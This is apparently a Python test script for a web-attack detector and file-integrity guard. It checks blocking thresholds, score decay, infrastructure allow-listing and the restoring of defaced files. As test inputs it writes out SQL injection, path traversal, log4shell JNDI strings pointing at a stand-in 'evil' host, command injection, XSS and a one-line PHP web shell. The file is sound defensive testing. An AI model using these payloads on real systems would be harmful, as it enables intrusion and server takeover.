#!/usr/bin/env python3
import os, sys, tempfile
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import web_guard as wg
bad = []
def check(n, ok): print(("PASS " if ok else "FAIL ") + n); ok or bad.append(n)
clock = [1000.0]; rep, blk, logs = [], [], []
g = wg.WebGuard(rep.append, blk.append, lambda ip: "infra" if ip == "10.0.0.9" else None, now=lambda: clock[0], log=logs.append)
L = lambda ip, url, st=200, ua="Mozilla/5.0", m="GET": '%s - - [20/Nov/2026:10:00:00 +0000] "%s %s HTTP/1.1" %d 512 "-" "%s"' % (ip, m, url, st, ua)
for i in range(30): g.feed(L("198.51.100.%d" % (i + 1), "/index.php?id=%d" % i)); g.feed(L("198.51.100.%d" % (i + 1), "/products?page=2&q=select+a+shirt"))
check("normal traffic and normal words (select a shirt) are never blocked", not blk)
check("SQL injection is blocked and reported to the chain", g.feed(L("203.0.113.5", "/item?id=1%20UNION%20SELECT%20user,pass%20FROM%20users")) and blk == ["203.0.113.5"] and rep == ["203.0.113.5"])
check("path traversal", g.feed(L("203.0.113.6", "/download?f=../../etc/passwd")) is not None)
check("command injection / log4shell", g.feed(L("203.0.113.7", "/x?c=${jndi:ldap://evil/a}")) is not None)
check("XSS needs two hits (8 points each is below 10 once)", g.feed(L("203.0.113.8", "/s?q=<script>alert(1)</script>")) is None and g.feed(L("203.0.113.8", "/s?q=%3Cscript%3E")) is not None)
check("scanner user agent = block at once", g.feed(L("203.0.113.9", "/", ua="sqlmap/1.7")) is not None)
r = None
for i in range(25): r = g.feed(L("203.0.113.10", "/nothing%d" % i, st=404)) or r
check("404 scanning burst is blocked", r is not None and "203.0.113.10" in blk)
for i in range(2): g.feed(L("203.0.113.11", "/wp-login.php", st=404))
check("two probes alone (7 points) stay below the limit", "203.0.113.11" not in blk)
g.feed(L("203.0.113.11", "/.env", st=404)); check("a third probe crosses it", "203.0.113.11" in blk)
for i in range(210): clock[0] += 0.01; g.feed(L("203.0.113.12", "/", st=200))
check("HTTP flood (200 requests in 10 s) is blocked", "203.0.113.12" in blk)
before = len(blk); g.feed(L("10.0.0.9", "/a?x=../../etc/passwd")); check("own infrastructure is never blocked", len(blk) == before and any("WEB_SKIP" in x for x in logs))
clock[0] += 3600; g2 = len(blk); g.feed(L("203.0.113.13", "/q?id=1"));
check("score decays (old probes forgotten)", len(blk) == g2)
# integrity
R = tempfile.mkdtemp(); web = os.path.join(R, "www"); os.makedirs(web + "/img"); open(web + "/index.html", "w").write("<h1>clean</h1>"); open(web + "/img/a.png", "w").write("png")
snap = os.path.join(R, "snap"); n = wg.snapshot(web, snap); check("snapshot copies the clean web root", n == 2 and oct(os.stat(snap).st_mode & 0o777) == "0o700")
ev = []; ig = wg.Integrity(web, snap, os.path.join(R, "q"), ev.append, log=logs.append, now=lambda: 5)
check("clean root = nothing to do", ig.check() == {"restored": [], "quarantined": [], "new": []})
open(web + "/index.html", "w").write("HACKED by x"); os.remove(web + "/img/a.png"); open(web + "/shell.php", "w").write("<?php system($_GET[0]);"); open(web + "/news.html", "w").write("new page")
o = ig.check()
check("defaced file restored from the snapshot", open(web + "/index.html").read() == "<h1>clean</h1>" and "index.html" in o["restored"])
check("deleted file restored", os.path.exists(web + "/img/a.png"))
check("new web shell quarantined (moved out, mode 000)", not os.path.exists(web + "/shell.php") and len(os.listdir(R + "/q")) == 1 and os.stat(os.path.join(R, "q", os.listdir(R + "/q")[0])).st_mode & 0o777 == 0)
check("a new harmless html page is only noted, not touched", os.path.exists(web + "/news.html") and o["new"] == ["news.html"])
check("suspect callback fired (so the attacker address can be blocked)", len(ev) == 1)
# v13.23 regression cases found by the round-2/3 evaluation
def _pts(u, st=200):
    c = wg.classify(L("203.0.113.77", u, st)); return sum(p for _, p in c[3]) if c else 0
check("math in a comment (5 < 10 and 10 > 5) is flagged weakly, never blocks alone", 0 < _pts("/p?comment=5+%3C+10+and+10+%3E+5") < 10)
check("a normal query string with &id= and &ping= is not a command", _pts("/list?a=1&id=5&ping=1") == 0)
check("pipe-id, &&uname, log4shell obfuscation, ognl are attacks", all(_pts(u) >= 10 for u in ["/r?c=a|id", "/r?c=a&&uname%20-a", "/r?c=${${::-j}ndi:ldap://e/a}", "/r?c=%{(#_='x')}"]))
check("stacked queries, order-by-comment, xp_cmdshell are SQL injection", all(_pts(u) >= 10 for u in ["/a?id=1;DELETE%20FROM%20logs--", "/a?id=1%20ORDER%20BY%2010--", "/a?id=1;EXEC xp_cmdshell('x')"]))
check("sensitive absolute paths and wrappers are traversal", all(_pts(u) >= 10 for u in ["/f?p=/etc/hosts", "/f?p=/var/log/auth.log", "/a?file=php://filter/resource=x"]))
check("pages about security topics are not blocked", all(_pts(u) < 10 for u in ["/blog/sql-injection-prevention-guide", "/docs/etc-hosts-file-explained", "/search?q=what+is+a+reverse+shell"]))
check("null byte inside a tag does not hide it", _pts("/p?t=<scr%00ipt>alert(1)</scr%00ipt>") >= 8)
sys.exit(1 if bad else 0)
